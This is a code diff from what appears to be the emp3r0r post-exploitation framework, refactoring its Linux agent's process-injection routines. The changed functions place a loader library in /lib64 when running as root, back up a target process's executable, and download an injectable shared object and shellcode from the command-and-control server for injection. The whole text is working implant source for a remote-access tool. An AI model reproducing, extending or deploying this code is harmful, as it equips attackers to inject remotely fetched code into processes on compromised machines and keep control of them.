@@ -10,10 +10,12 @@ import (
 	"runtime"
 	"strings"
 
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/lib/exe_utils"
 	"github.com/jm33-m0/emp3r0r/core/lib/external_file"
+	"github.com/jm33-m0/emp3r0r/core/lib/sysinfo"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -25,9 +27,9 @@ func prepare_loader_so(pid int, bin string) (so_path string, err error) {
 	}
 
 	so_path = fmt.Sprintf("/%s/%s",
-		common.RuntimeConfig.UtilsPath, NameTheLibrary())
+		common.RuntimeConfig.UtilsPath, common.NameTheLibrary())
 	if os.Geteuid() == 0 {
-		so_path = fmt.Sprintf("/lib64/%s", NameTheLibrary())
+		so_path = fmt.Sprintf("/lib64/%s", common.NameTheLibrary())
 	}
 	if !util.IsFileExist(so_path) {
 		out, err := external_file.ExtractFileFromString(external_file.LoaderSO_Data)
@@ -62,7 +64,7 @@ func prepare_guardian_sc(pid int) (shellcode string, err error) {
 	// prepare guardian_shellcode
 	proc_exe := util.ProcExePath(pid)
 	// backup original binary
-	err = CopyProcExeTo(pid, common.RuntimeConfig.AgentRoot+"/"+util.FileBaseName(proc_exe))
+	err = util.CopyProcExeTo(pid, common.RuntimeConfig.AgentRoot+"/"+util.FileBaseName(proc_exe))
 	if err != nil {
 		return "", fmt.Errorf("failed to backup %s: %v", proc_exe, err)
 	}
@@ -80,11 +82,11 @@ func prepare_guardian_sc(pid int) (shellcode string, err error) {
 }
 
 func prepare_shared_lib(checksum string) (path string, err error) {
-	path = fmt.Sprintf("/usr/lib/%s", NameTheLibrary())
-	if !HasRoot() {
-		path = fmt.Sprintf("%s/%s", common.RuntimeConfig.UtilsPath, NameTheLibrary())
+	path = fmt.Sprintf("/usr/lib/%s", common.NameTheLibrary())
+	if !sysinfo.HasRoot() {
+		path = fmt.Sprintf("%s/%s", common.RuntimeConfig.UtilsPath, common.NameTheLibrary())
 	}
-	_, err = SmartDownload("", "to_inject.so", path, checksum)
+	_, err = c2transport.SmartDownload("", "to_inject.so", path, checksum)
 	if err != nil {
 		err = fmt.Errorf("failed to download to_inject.so from CC: %v", err)
 	}
@@ -93,7 +95,7 @@ func prepare_shared_lib(checksum string) (path string, err error) {
 
 // prepare the shellcode
 func prepare_sc(pid int, checksum string) (shellcode string, shellcodeLen int) {
-	sc, err := SmartDownload("", "shellcode.txt", "", checksum)
+	sc, err := c2transport.SmartDownload("", "shellcode.txt", "", checksum)
 	if err != nil {
 		log.Printf("Failed to download shellcode.txt from CC: %v", err)
 		// prepare guardian_shellcode
